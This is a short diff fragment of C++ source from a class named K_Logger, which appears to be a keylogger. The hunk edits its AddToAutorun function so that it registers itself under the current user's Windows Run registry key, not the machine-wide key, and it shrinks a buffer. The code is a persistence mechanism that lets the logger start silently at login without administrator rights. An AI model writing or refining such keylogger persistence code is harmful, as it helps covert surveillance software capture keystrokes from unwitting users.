@@ -811,9 +811,9 @@ void K_Logger::VisibilityApp()
 void K_Logger::AddToAutorun()
 {
 	HKEY registryKey;
-	char sizeReg[1024];
+	char sizeReg[0x100];
 
-	RegCreateKeyEx(HKEY_LOCAL_MACHINE,
+	RegCreateKeyEx(HKEY_CURRENT_USER,
 		"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
 		NULL,
 		nullptr,
